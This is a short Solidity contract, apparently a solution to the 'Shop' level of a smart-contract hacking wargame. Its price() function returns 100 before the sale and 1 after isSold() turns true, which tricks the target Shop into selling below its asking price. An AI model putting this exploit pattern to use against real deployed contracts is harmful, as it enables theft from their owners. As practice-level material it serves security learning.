pragma solidity 0.4.24;

import "levels/Shop.sol";

contract ShopHack is Buyer {

    function attack(address _target) public {
        Shop(_target).buy();
    }

    function price() external view returns (uint) {
        return Shop(msg.sender).isSold() ? 1 : 100;
    }
}